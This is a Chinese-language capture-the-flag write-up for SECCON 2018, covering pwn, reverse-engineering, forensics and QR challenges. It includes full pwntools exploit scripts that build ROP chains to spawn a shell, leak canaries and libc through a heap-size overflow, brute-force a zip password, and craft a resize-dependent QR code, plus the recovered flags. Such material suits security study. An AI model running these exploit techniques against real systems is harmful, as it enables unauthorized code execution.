## Pwn

### classic

```
// file
classic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a8a02d460f97f6ff0fb4711f5eb207d4a1b41ed8, not stripped

// checksec
[*] '/tmp/tmp/SECCON2018_online_CTF/Pwn/classic/files/classic'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

最經典的 overflow，先用 ROP 串 leak libc + code reuse 的 gadget，最後再串 `system("/bin/sh")` 的 ROP。

```python
#!/usr/bin/python3                                                    
      
from pwn import *                                                     
      
context.arch = 'amd64'
r = process("./classic")                                              
      
pop_rdi_ret = 0x0000000000400753                                      
puts_got = 0x601018                                                   
puts_plt = 0x400520                                                   
ret = 0x400501                                                        
_main = 0x4006a9                                                      
      
offset = 0x40 + 8                                                     
payload = offset * b'\xff' + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_main)
      
r.sendlineafter("Local Buffer >> ", payload)                          
r.recvuntil("Have a nice pwn!!\n")                                    
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x875a0                     
info(f"libc: {hex(libc)}")                                            
_system = libc + 0x55410                                              
binsh = libc + 0x1b75aa                                               
      
payload = offset * b'\xff' + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(_system)
r.sendlineafter("Local Buffer >> ", payload)                                                                                                                             
r.interactive()
```

### Profile

```
// file
profile: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=80d81e528f97618c35e57b145a0c11df21769e67, not stripped

// checksec
[*] '/tmp/tmp/SECCON2018_online_CTF/Pwn/profile/files/profile'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

c++ 中 string 的結構為:

- 0x0 ~ 0x8: `c_str` pointer，當長度小的時候指向 stack，長度大的時候指向 heap
- 0x8 ~ 0x10: string length
- 0x10 ~ 0x18: 根據字串長度，會是 `c_str` value 或是 string length
- 0x18 ~ 0x20: garbage

以下為 `malloc_usable_size()` 的 source code:

```c
static size_t
musable (void *mem)
{
...
	else if (inuse (p))
        return chunksize (p) - SIZE_SZ;
...
}

size_t
__malloc_usable_size (void *m)
{
  size_t result;

  result = musable (m);
  return result;
}
```

如果 string 的 c_str 位置在 stack，`malloc_usable_size()` 有可能會回傳一個負數，讓 `getn()` 可以 overwrite，而先決條件為:

1. size 的 LSB 的要是 1，代表 chunk inuse，就能通過 `inuse(p)` 的檢查
2. chunksize 不能大於 8，這樣在減 `SIZE_SZ` 時就會小於 0 造成 overflow

透過 overflow 從 `message` 蓋到寫到 string `name`  的 struct，並更改 `name` 的 `c_str` pointer 成 got 等等可以 leak 的 address。而 canary 與 stack address 會稍微用 brute force 的方法，並且由於 stack 的後面一個 byte 不固定，因此需要找固定的值 (這邊為 'AAAAAAAA') 來確定在 stack 內的 offset，再透過相鄰的 address 來 leak stack、canary。最後串 ROP 就可以了。

```python
#!/usr/bin/python3
 
from pwn import *
import sys
 
_stdout_got = 0x602348
 
r = process("./profile")
r.sendlineafter('Name >> ', 'A'*8)
r.sendlineafter('Age >> ', '2')
r.sendlineafter('Message >> ', 'M')
 
##### leak stack
stack = 0
offset = 0
while True:
    r.sendlineafter("0 : exit", "1")
    r.sendlineafter("Input new message >> ", b'B'*0x10 + bytes([offset])) # partial overwrite
    r.sendlineafter("0 : exit", "2")
    r.recvuntil("Name : ")
    data = r.recvline()[:-1]
    if data == b'A'*8:
        break
    offset += 0x10
 
r.sendlineafter("0 : exit", "1")
r.sendlineafter("Input new message >> ", b'B'*0x10 + bytes([offset-0x10])) # partial overwrite
r.sendlineafter("0 : exit", "2")
r.recvuntil("Name : ")
stack = u64(r.recvline()[:-1].ljust(8, b'\x00'))
info(f"stack: {hex(stack)}")
 
##### leak canary
r.sendlineafter("0 : exit", "1")
r.sendlineafter("Input new message >> ", b'B'*0x10 + p64(stack+0x78+1))
r.sendlineafter("0 : exit", "2")
r.recvuntil("Name : ")
canary = b'\x00' + r.recv(7)
info(f"canary: {canary}")
 
##### leak libc
r.sendlineafter("0 : exit", "1")
r.sendlineafter("Input new message >> ", b'A'*0x10 + p64(_stdout_got))
r.sendlineafter("0 : exit", "2")
r.recvuntil("Name : ")
libc = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x1ec6a0
info(f"libc: {hex(libc)}")
 
binsh = libc + 0x1b75aa
_system = libc + 0x55410
pop_rdi_ret = 0x401713
ret = 0x400df1
rop = p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(_system)
payload = b'A'*0x10 + p64(stack + 0x60) + p64(0x8) + b'B'*0x10 + p64(0) + canary + b'C'*0x18 + rop
 
r.sendlineafter("0 : exit", "1")
r.sendlineafter("Input new message >> ", payload)
r.sendlineafter("0 : exit", "0")                                             
 
r.interactive()
```

- asm:
  - `CMOVNE DST, SRC`: The cmovne conditional move if not equal check the state of ZF

## Reverse

### Runme

一個一個比較 Command 是否等於特定字元，而特定字元中包含 flag `SECCON{Runn1n6_P47h}`。

### Block

附檔為 apk，使用 [apktool](https://ibotpeaches.github.io/Apktool/install/) 把 resources extract 出來 (`apktool d block.apk`)，在 `assets/bin/Data` 內有許多以 `Unity` 為 prefix 的檔案，安裝 `android studio` 後新增一個 device，最後把 apk 丟進去就可以執行。開啟後會看到 flag 被擋住，並在後面快速旋轉，有兩種方向:

1. 移除屏幕
2. 位移 flag 並停止旋轉

利用 [Unity Assets Bundle Extractor](https://github.com/DerPopo/UABE) extract unity resource 的 bundle，並將 GameObject Cube 給移除 (前面的藍色屏幕) 即可，而修改完必須重新 sign apk ，取得 certificate 後才能給 android studio 執行，sign apk 要有 `debug.keystore`，可以在 windows `%USER\.android\debug.keystore` 找到，而預設 alias name 是 `androiddebugkey`、`storepass` 與 `keypass` 都是 android， 執行 `jarsigner -verbose -signedjar block-signed.apk -keystore debug.keystore -storepass android -keypass android block.apk androiddebugkey` 即可得到 signed apk。安裝前必須將前一個 app 移除，不然會顯示 `INSTALL_FAILED_UPDATE_INCOMPATIBLE`，而在執行後抓準時間截圖即可取得完整的 flag。

- apktool
  - `apktool d file.apk`: unpack apk
  - `apktool b dir`: pack to apk
- `debug.keystore` 會在執行任意 project 後產生

### Shooter

使用 `dex2jar` 可以將 dex file 轉成 jar，再透過 jd-gui 即可看到 java code。Unity Game 可以跨平台是藉助於 **Mono**，而 Mono 會把 C# 的 IL (Intermeidate Language) 透過 mono vm 以及 runtime library (JIT)，動態轉成是對應平台的 machine code 來執行。而 C# 2j的程式碼會存在 `Assembly-CSharp.dll` 這個檔案之中 (可以用 dnSpy decompile)。

不過該題目並不是用 mono 而是 IL2CPP，差別在於 IL 會被 IL2CPP.exe 轉成 C++ code，再用 native c++ compiler 編譯，透過 libil2cpp.so runtime library，將 executable asm 放入 IL2CPP VM 來執行。

使用 `IL2CppInspector` 把 `libil2cpp.so` 加上一些 symbol 方便逆向，`IL2CppInspector` 產生的 script 直接使用 IDA 的 script file (Alt + F7) 載入即可。而這邊我執行 `IL2CppInspector` 會有一些地方失敗，因此嘗試 `IL2CppDumper`，按照要求的副檔名給檔案就好 (`ida.py` -> `script.json` -> `il2cpp.h`)。

查看是否有特別的字串，雖然直接搜 string 搜不到，不過 tool 產生的 json 能夠看到一些字串如 `shooter.pwn.seccon` 要在哪些 address，而可以猜測在遊戲的最後 binary 會發送 request 到 server，新增一筆遊戲紀錄，[mitmproxy](https://github.com/mitmproxy/mitmproxy) 提供簡單明瞭的界面來觀察送出的 request，使用前需要安裝在 `C:\Users\USRE\.mitmproxy` 目錄底下的 certificate。

Windows 環境不知道為什麼攔截不到封包，不過從 `IL2CppDumper` 產出的 `script.json` 以及 `dump.cs` 就能看出有向 server 發送 POST request 來更新分數。

```c#
/ Namespace: 
public class GameDirector : MonoBehaviour // TypeDefIndex: 3753
{
	// Fields
	private GameObject scoreLabel; // 0xC
	private GameObject missLabel; // 0x10
	private float score; // 0x14
	private int miss; // 0x18
	private GameObject scoreFormView; // 0x1C
	private GameObject rankingView; // 0x20
	private GameObject planeGenerator; // 0x24
	private string apiEndpoint; // 0x28
	public GameDirector.STEP step; // 0x2C
	public GameDirector.STEP nextStep; // 0x30

	// Methods

	// RVA: 0xB1BF86 Offset: 0xB1BF86 VA: 0xB1BF86
	public void .ctor() { }

	// RVA: 0xB1C018 Offset: 0xB1C018 VA: 0xB1C018
	private void Start() { }

	// RVA: 0xB1C123 Offset: 0xB1C123 VA: 0xB1C123
	private void ChangeStep() { }

	// RVA: 0xB1C13B Offset: 0xB1C13B VA: 0xB1C13B
	private void HandleChangingStep() { }

	// RVA: 0xB1C41C Offset: 0xB1C41C VA: 0xB1C41C
	private void Update() { }

	// RVA: 0xB1C283 Offset: 0xB1C283 VA: 0xB1C283
	public void UpdateScore() { }

	// RVA: 0xB1C36D Offset: 0xB1C36D VA: 0xB1C36D
	public void UpdateMiss() { }

	// RVA: 0xB1C450 Offset: 0xB1C450 VA: 0xB1C450
	public void UpdateRanking(string rankingText) { }

	// RVA: 0xB1C4F9 Offset: 0xB1C4F9 VA: 0xB1C4F9
	public void AddScore(float score) { }

	// RVA: 0xB1C530 Offset: 0xB1C530 VA: 0xB1C530
	public void IncrementMiss() { }

	// RVA: 0xB1C5D3 Offset: 0xB1C5D3 VA: 0xB1C5D3
	public void SubmitScore() { }

	// RVA: 0xB1C7B6 Offset: 0xB1C7B6 VA: 0xB1C7B6
	public void Retry() { }

	[DebuggerHiddenAttribute] // RVA: 0x13BE5D Offset: 0x13BE5D VA: 0x13BE5D
	// RVA: 0xB1C716 Offset: 0xB1C716 VA: 0xB1C716
	private IEnumerator PostScore(string name, int score) { }
}
```

最後 server 登入頁面可以 sql injection，將 db 的 information leak 出來後就有 flag。

P.S. 因為 API 名稱可能有變，因此 IDA 版本的不同會影響到 script 能不能執行。

- tools
  - [dex2jar](https://github.com/pxb1988/dex2jar): Tools to work with android .dex and java .class files，可以把 apk 轉成 jar，再使用 jd-gui 來看 java decompile code
    - [download](https://sourceforge.net/projects/dex2jar/)
  - [IL2CppInspector](https://github.com/djkaty/Il2CppInspector): Il2CppInspector helps you to reverse engineer IL2CPP applications, providing the most complete analysis currently available
    - libil2cpp.so 的 metadata 為 `global-metadata.dat`，通常在 `assets/bin/Data/Managed/Metadata/` 內
    - 選擇 `python script for disassemblers` -> `IDA`
  - [IL2CppDumper](https://github.com/Perfare/Il2CppDumper): Unity il2cpp reverse engineer，功能與 `IL2CppInspector` 大致相同
- [reverse unity-based apk 文章](https://palant.info/2021/02/18/reverse-engineering-a-unity-based-android-game/)
- [逆向 apk 文章](https://blog.techbridge.cc/2016/03/24/android-decompile-introduction/)
- [APK wiki](https://zh.wikipedia.org/wiki/APK)
  - apk == 代碼檔案(.dex 檔案)，檔案資源（resources）， assets，憑證（certificates），和清單檔案（manifest file）
- [mono and unity](https://www.cnblogs.com/u3ddjw/p/10909975.html)
- [mono vs. IL2CPP](https://zhuanlan.zhihu.com/p/352463394)
- [unity 遊戲更改](https://www.52pojie.cn/thread-618515-1-1.html)
- proxy
  - burp
    - 需要 java8，更改網址 (`otn` -> `otn-pub`) 可以不用註冊就下載
    - 運行後到 http://burp/ 下載憑證，並且 Windows 環境下只能[透過 firefox 來匯入憑證](https://portswigger.net/burp/documentation/desktop/getting-started/proxy-setup/certificate/firefox)
  - mitmproxy
    - 似乎不能攔到 android 送的 packet

### Special_instructions

執行檔的指令集為 Moxie:

```bash
$ readelf -a runme
ELF Header:
  Magic:   7f 45 4c 46 01 02 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, big endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Moxie
  Version:                           0x1
  Entry point address:               0x1400
  Start of program headers:          52 (bytes into file)
  Start of section headers:          1936 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         3
  Size of section headers:           40 (bytes)
  Number of section headers:         9
  Section header string table index: 8
```

找 `Moxie` 的 [toolchain](http://moxielogic.org/blog/pages/toolchain.html)，必須要一個個 deb 透過 `sudo dpkg -i <file>` 來安裝 (`sudo apt autoremove <package>` 解除安裝)，我只裝了 `moxielogic-moxie-elf-binutils` 以及 `moxielogic-moxie-elf-gdb`。

不過因為 opcode 0x16 以及 0x17 為自定義，因此 `qemu-system-moxie -s -S -kernel runme` 運行不起來 (也有可能是其他原因)，因此這題要肉眼 decompile。相關的 symbol address information 可以用 `/opt/moxielogic/bin/moxie-elf-readelf` 或是 `readelf` 查看。

看 moxie instruction set 的 [document](http://moxielogic.org/blog/pages/architecture.html)，比較特殊的 instruction 如下:

- `ldi.l`: load imm long (32 bit)
- `jsra`: Jump to subroutine at absolute address
- `jsr`: Jump to subroutine, subroutine 的位置在 `$rA`
- `ld.b`: Load byte

根據 decompile 後的 instruction 以及優化，最終 program flow & exploit 大致如下:

```python
#!/usr/bin/python3
        
flag = bytes.fromhex("6d72c3e2cf95549db6ac0384c3c23593c3d77ce2ddd4ac5e99c9a534de064e00")
randval = bytes.fromhex("3d05dc31d18aaf2996facb1b01ece2f715706cf47ea19e0e01f9c24cbaa0a108")
seed = 0x92d68ca2
        
def get_rand():
    global seed
    seed ^= (seed << 13) & 0xffffffff
    seed ^= (seed >> 17) & 0xffffffff
    seed ^= (seed << 15) & 0xffffffff
    return seed & 0xff
        
for i in range(0x1f):
    print(chr(get_rand() ^ flag[i] ^ randval[i]), end='')
```

`/opt/moxielogic/bin/moxie-elf-objdump -d -s ./runme` 可以得到 .data (`flag` and `ranval`) 以及 assembly .text，而透過 `strings` 可以得知 `get_random_value()` 是用 xorshift32 來當 PRNG (pseudo random number generator)，如下:

```
SETRSEED: (Opcode:0x16)
        RegA -> SEED
GETRAND: (Opcode:0x17)
        xorshift32(SEED) -> SEED
        SEED -> RegA
```

exploit 的部分一開始用 c 寫遇到一堆障礙，最後才知道 char byte array (e.g. `"=\x05\xdc1\xd1\x8a\xaf)"`) 遇到 `\xdc1` 時 `\xd` 的 `d` 會被 ignore 掉 (`hex escape sequence out of range`)，因此最後選擇用 python 寫。

最後得到 flag `SECCON{MakeSpecialInstructions}`。

### Special Device File

這題 binary 變成是 `ARM aarch64`，因此可以丟入 IDA 看，而結果會發現程式邏輯差不多跟上題一樣，差別只在於從 `xofshift32` 變成 `xorshift64`，而 `xorshift64` 的操作 wiki 上也有寫，exploit 如下:

```python
#!/usr/bin/python3       
                      
from pwn import *        
                      
seed = 0x139408DCBBF7A44
                      
def get_rand():          
    global seed          
    seed ^= (seed << 13) & 0xffffffffffffffff
    seed ^= (seed >> 7) & 0xffffffffffffffff
    seed ^= (seed << 17) & 0xffffffffffffffff
    return seed & 0xff                                                                                                                                         
with open("./runme", "rb") as f:
    f.seek(0x1800)       
    flag = f.read(0x20)
    randval = f.read(0x20)
                      
for i in range(0x1f): 
    print(chr(flag[i] ^ randval[i] ^ get_rand()), end='')
```

得到 flag `SECCON{UseTheSpecialDeviceFile}`。

而官方的預期解為 patch aarch64 GDB simulator (`sim/aarch64/simulator.c`)，然後再重新編譯執行，而 source 可以從 github 上找到，repo 名稱為 [binutils-gdb](https://github.com/bminor/binutils-gdb/tree/master/sim/aarch64)。

### TctkToy

程式需要餵入第二個參數，並且第二個參數只能傳入 1 或 2 才能正常執行。程式一開始會將 `sub_411393` 做為 `WindowProc` 也就是 loop function，而 `sub_411393` 可以接收檔案並執行 (`WM_DROPFILES`)，之後處理檔案用 x32dbg 追蹤，而因為 `tctkToy.exe` 需要接收參數，因此要在 x32dbg 內的 `檔案(F) -> 更改命令列(L)` 加入參數 `1` (`"tctkToy.exe" "1"`)。

在 `StartAddress` function 中有執行 `sub_BA2B70`，其中內容有執行如 `Tcl_Init()` 與 `Tk_Init()`，

```c
int __stdcall sub_BA2B70(int a1)
{
  const CHAR *v1; // eax
  UINT v3; // [esp+0h] [ebp-D8h]
  int v4; // [esp+D0h] [ebp-8h]

  __CheckForDebuggerJustMyCode(&unk_BB004D);
  v4 = Tcl_CreateInterp();
  Tcl_Init(v4);
  Tk_Init(v4);
  if ( Tcl_EvalFile(v4, a1) )
  {
    v1 = Tcl_GetStringResult(v4);
    MessageBoxA(0, v1, 0, v3);
    MessageBoxA(0, "It cannot eat this completely.", "Oops!", 0);
    exit(1);
  }
  Tk_MainLoop();
  Tcl_Finalize();
  return 0;
}
```

必須通過一些檢查:

- 檔案路徑開頭為 `C:\\tctkToy`
- Snapshot 的結果必須要有 process `Taskmgr.exe` 的 information
- 要有 window 的名稱為 `tctkROBO`
- `tctkROBO` window 必須要有 3 個 class name 為 `Button` 的 object，以及 1 個 class name 為 `TkChild` 的 object

之後還有一些行為 & 限制:

- 找出每行 code 的前 2 個 bytes 存入 `Source` (`strcpy_s()` 需要留一個 space 給 `\0`)，如果不包含 `.` 就與 `Destination` concat，最多串 24 個，也就是做 12 行 (24 + 1 (null))
- 對結果做 sha256 (`CryptCreateHash(hProv, 0x800Cu, 0, 0, &hHash)`, `0x800C == CALG_SHA_256 `)，如果 hash value 的前 20 bytes 為 `a683618184fc18105b71` 即可得到 flag

tcl (Tool Command Language, pronounce tickle) 的說明為: `Tclsh is a shell-like application that reads Tcl commands from its standard input or from a file and evaluates them`，如果要執行 tcl script，Windows 環境需要安裝 [ActiveTcl](https://www.activestate.com/products/tcl/downloads/)，而 GUI 的部分必須要透過 `Wish` 來執行，也就是執行 tk command (Tk is the standard GUI not only for Tcl)。

```tcl
cd "C:\\tctkToy"
exec cmd /c start Taskmgr.exe
wm title . "tctkROBO"
canvas .c
image create photo -file "C:\\Users\\jerry\\Desktop\\file\\face.png"
pack .c
button .b1 -text ""
pack .b1
button .b2 -text ""
pack .b2
button .b3 -text ""
pack .b3
```

如果直接執行 `Taskmgr.exe`，會影響到後續的行為，因此可以透過 `start` 來執行，並且 pack 順序必須要每次新建一個 component 就 pack 一次 (失敗會有提示)。後來解題才發現將程式執行起來後，右下角有提示要 repair 圖片，並且 Hints 也有說明 `[Hint] tctkToy: you can write a tcl file with just only "button", "exec", "cd", "wm", "canvas", "image" and "pack" command.`。

最後湊出順序，得到 flag。關於 tcl/tk 的指令可以參考 [tk script document](https://docs.activestate.com/activetcl/8.6/tcl/TkCmd/contents.html)。



Windows API

- `lpfnWndProc`: 為 WNDCLASSEX member，並且 lpfn 為 long point function，代表指向 `WindowProc` function ptr
- `WindowProc(hwnd, uMsg, wParam, lParam)`
  - `hwnd`: A handle to the window
  - `uMsg`: The message，參考[List_Of_Windows_Message](https://wiki.winehq.org/List_Of_Windows_Messages)
  - `wParam`: Additional message information, depend on uMsg
  - `lParam`: Additional message information, depend on uMsg
- `RegisterClassExW()`: Registers a window class for subsequent use in calls to the CreateWindow or CreateWindowEx function
- `j_CreateToolhelp32Snapshot(dwFlags, th32ProcessID)`: Takes a snapshot of the specified processes, as well as the heaps, modules, and threads used by these processes，取得指定 pid process 的 information
  - `th32ProcessID`: 如果是 0 的話就是自己
  - `dwFlags`: 2 為 TH32CS_SNAPPROCESS，也就是 Includes all processes in the system in the snapshot
- `j_Process32First(hSnapshot, lppe)`: Retrieves information about the first process encountered in a system snapshot
- `j_Process32Next`: 取得 Snapshot 的下一個 process information
- `FindWindowA(lpClassName, lpWindowName)`: Retrieves a handle to the top-level window whose class name and window name match the specified strings
- `EnumChildWindows(hWndParent, lpEnumFunc, lParam)`: Enumerates the child windows that belong to the specified parent window by passing the handle to each child window, in turn, to an application-defined callback function
- `CryptHashData(pbData, dwDataLen, dwFlags)`: 建立 hash object
- ` CryptGetHashParam(dwParam, pbData, pdwDataLen, dwFlags)`: retrieves data that governs the operations of a hash object
- 句柄 == Handle

## Forensics

### Unzip

由 `makefile.sh` 可以得知 zip 是拿 timestamp 作為密碼，而 unix 會記錄檔案上次被修改的時間，因此只要從修改時間附近去 brute force 密碼，就能成功解壓縮。

```python
#!/usr/bin/python3
                                                        
import time
import subprocess
 
# ls -la --time-style=full-iso
start = 1540566600 # 2018/10/26 15:10:00
end = round(time.time())
 
for t in range(start, end):
    p = subprocess.Popen(["unzip", "-o", "-P", str(t), "flag.zip"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        out, err = p.communicate(timeout=0.1)
        if b'incorrect password' not in err and b'invalid compressed' not in err:
            print(f"password: {t}")
            break
    except Exception as e:
        print(e)
        p.kill()
# 1540566641
```

`SECCON{We1c0me_2_SECCONCTF2o18}`

### History

解壓縮後得到未知格式的檔案 `J`，在 strip 掉 `\x00` 後會發現一些字串如 `ngen_service.log`、 `setupapi.dev.log`，該檔案為 USN (**U**pdate **S**equence **N**umber) Journal，用來記錄檔案更新的情況 (`$UsnJrnl:$J`)，可以使用工具如 [ntfs-log-tracker](https://sites.google.com/site/forensicnote/ntfs-log-tracker) 或是 [USN Analytics](http://www.kazamiya.net/en/usn_analytics) 來 parse 該類型的檔案。

瀏覽一下紀錄能發現有個 .txt 系列的檔案名稱很像 flag，查看該系列檔案是做了哪些操作會發現，首先他建立了一個檔案叫做 `SEC.txt`，並且會有一筆改名的紀錄 `SEC.txt` -> `CON{.txt`，持續追蹤下去: `CON{.txt` -> `F0r.txt` -> `ensic.txt` -> `s.txt` -> `_usnjrnl.txt` -> `2018}.txt` --> `SECCON{F0rensics_usnjrnl2018}`。



關於 NTFS Journal Forensics 可以參考[這部影片](https://www.youtube.com/watch?v=1mwiShxREm8&ab_channel=13Cubed)，而 NTFS Journal 是指 OS 會記錄 volume 的變更，像是 crash、power failure 等等，有時就是 log，而有時可以讓 OS 用來 rollback。

兩種 Type 的 Journal (change journal):

- USN Journal
  - `$EXTEND\$USNJRNL`
  - track 檔案/目錄的變動
- Logfile
  - `$LOGFILE`
  - MFT metadata (e.g. timestamp)

Tool:

- [dfir_ntfs](https://github.com/msuhanov/dfir_ntfs)
- [FTK Imager](https://accessdata.com/product-download/ftk-imager-version-4-5)
- anjp-free (現在下載不到)

## QR

### QRChecker

建置 CGI 環境:

1. 建立 `cgi-bin` 並將 `cgi.py` 放入 
2. `python3 -m http.server --bind localhost --cgi 8000`
3. 存取 `http://localhost:8000/cgi-bin/cgi.py`

cgi.py 內負責處理 upload file 的程式碼如下:

```python
sizes = [500, 250, 100, 50]
...
    form = cgi.FieldStorage()
    data = form["uploadFile"].file.read(1024 * 256)
    image= Image.open(io.BytesIO(data))
    for sz in sizes:
        image = image.resize((sz, sz))
        result= zbarlight.scan_codes('qrcode', image)
        if result == None:
            break
        if 1 < len(result):
            break
        codes.add(result[0])
    for c in sorted(list(codes)):
        print(c.decode())
    if 1 < len(codes):
        print("SECCON{" + open("flag").read().rstrip() + "}")
...
```

只要能提供一個 QRcode 滿足在大小 500, 250, 100, 50 中，至少兩種以上是 valid 的，就能拿到 flag。

在 SECCON 2018 舉辦期間，`PIL.Image.resize()` 的 default resample 是使用 `PIL.Image.NEAREST`，即挑選最近的 pixel (`Pick one nearest pixel from the input image. Ignore all other input pixels.`)，相對縮小，放大圖片的情況比較好理解，不過測試結果大概是: 如果有一個 8x8 的圖片，在 (4,4), (4,8), (8,4), (8,8) 四個座標點上的顏色會在縮小後保留，並且可以想像因為其他 pixel 不變的關係，每個座標點都放大了兩倍。

可以想像一下，當 500x500 的 QRcode 圖片中有一些小黑點，會因為 QRcode scanner 有容錯率而被 ignore 掉，然而當縮小到 50x50 時，原本 pixel 就放大了 10 倍，變成 QRcode 上的一個 unit，因此我們可以透過這種方式，讓 500x500 與 50x50 偵測到的內容不一樣。

可以測試一下:

```python
#!/usr/bin/python3
 
from PIL import Image
import numpy as np
import zbarlight
 
def imageToMatrix(img):
    return np.array(image.getdata(0), dtype="uint8").reshape(image.getbbox()[2:])
 
def matrixToImage(matrix):
    return Image.fromarray(matrix)
 
matrix = np.arange(16*16, dtype="uint8").reshape(16, 16)                             
sizes = [8, 4, 2]
image = matrixToImage(matrix)
 
print("Top 10x10 block of original image:")
print(matrix[:16, :16])
 
for sz in sizes:
    image = image.resize((sz, sz), resample=Image.NEAREST)
 
    matrix2 = imageToMatrix(image)
    print("\nResized image:")
    print(matrix2)
```

輸出結果為:

```
Top 10x10 block of original image:
[[  0   1   2   3   4   5   6   7   8   9  10  11  12  13  14  15]
 [ 16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31]
 [ 32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47]
 [ 48  49  50  51  52  53  54  55  56  57  58  59  60  61  62  63]
 [ 64  65  66  67  68  69  70  71  72  73  74  75  76  77  78  79]
 [ 80  81  82  83  84  85  86  87  88  89  90  91  92  93  94  95]
 [ 96  97  98  99 100 101 102 103 104 105 106 107 108 109 110 111]
 [112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127]
 [128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143]
 [144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159]
 [160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175]
 [176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191]
 [192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207]
 [208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223]
 [224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239]
 [240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255]]

Resized image:
[[ 17  19  21  23  25  27  29  31]
 [ 49  51  53  55  57  59  61  63]
 [ 81  83  85  87  89  91  93  95]
 [113 115 117 119 121 123 125 127]
 [145 147 149 151 153 155 157 159]
 [177 179 181 183 185 187 189 191]
 [209 211 213 215 217 219 221 223]
 [241 243 245 247 249 251 253 255]]

Resized image:
[[ 51  55  59  63]
 [115 119 123 127]
 [179 183 187 191]
 [243 247 251 255]]

Resized image:
[[119 127]
 [247 255]]
```



因此可以產生兩個 QRcode，並用以上方法將另一個 QRcode 嵌入裡面。不過這邊有一點要注意，因為 500x500 -> 100x100 時並非 2 的冪次，因此直接設相對位置 (9,9) 的 pixel 會在 100x100 時失敗，因此嘗試位移，而在相對位置 (7,7) 即可成功。

```python
from PIL import Image
import numpy as np
import qrcode    
                 
def add_margin(pil_img, top, right, bottom, left, color):
    width, height = pil_img.size
    new_width = width + right + left
    new_height = height + top + bottom
    result = Image.new(pil_img.mode, (new_width, new_height), color)
    result.paste(pil_img, (left, top))
                 
    return result
                 
qr = qrcode.QRCode(
    version=3,   
    error_correction=qrcode.constants.ERROR_CORRECT_H,
    box_size=10, 
    border=0     
)                
qr.add_data("1") 
qr.make(fit=True)
img1 = qr.make_image(fill_bolor="black", back_color="white",)
img1 = add_margin(img1, 0, 500-img1.size[0], 500-img1.size[0], 0, (255))
pix1 = img1.load()
                 
qr = qrcode.QRCode(
    version=3,   
    error_correction=qrcode.constants.ERROR_CORRECT_H,
    box_size=10, 
    border=0     
)                
qr.add_data("2") 
qr.make(fit=True)
img2 = qr.make_image(fill_bolor="black", back_color="white",)
img2 = add_margin(img2, 0, 500-img2.size[0], 500-img2.size[0], 0, (255))
pix2 = img2.load()
                 
_, sz = img2.size
                 
for x in range(7, sz, 10): # 不用 9 而是用 7，不然 100x100 時會失敗
    for y in range(7, sz, 10):
        pix1[x, y] = pix2[x, y]
                 
img1.save("output.png")
```



PIL.Image

- `Image.getdata(band=None)`:  returns the contents of this image as a sequence object
  - `band`: 預設為 None，代表是 RGB 三個 channels 都取，而 `band` = 0 代表取 R
- `Image.getbbox()`: calculates the bounding box of the non-zero regions in the image，回傳 4-tuple，分別為 `(left, upper, right, lower)`
- `Image.size`: 回傳 `Image`大小
- `Image.load()`: 回傳 `Image` 的 pixel list，可以直接對 pixel 做修改
- `Image.paste()`: 將其他 `Image` 的資料複製到 (top, left)
- `Image.new()`: 建立新的 `Image`

